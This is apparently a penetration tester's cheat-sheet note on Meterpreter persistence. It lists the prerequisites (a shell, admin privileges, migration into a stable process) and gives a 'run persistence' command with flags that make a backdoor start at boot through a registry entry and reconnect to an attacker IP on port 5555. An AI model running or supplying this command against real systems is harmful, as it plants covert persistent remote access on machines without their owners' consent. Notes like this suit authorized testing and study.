# Persistence via Meterpreter

### Checklists

We should have

* Shell on the target machine
* Priviledges escalated to Admin
* Migration of our payload to a stable process (e.g explorer.exe)

***

### Steps

In the Meterpreter session

`run persistence -X -i 10 -p 5555 IP`

* X means run on system startup
* i means the connection attempt interval
* p means port to connect to and the ip

It makes an entry in the registry

***
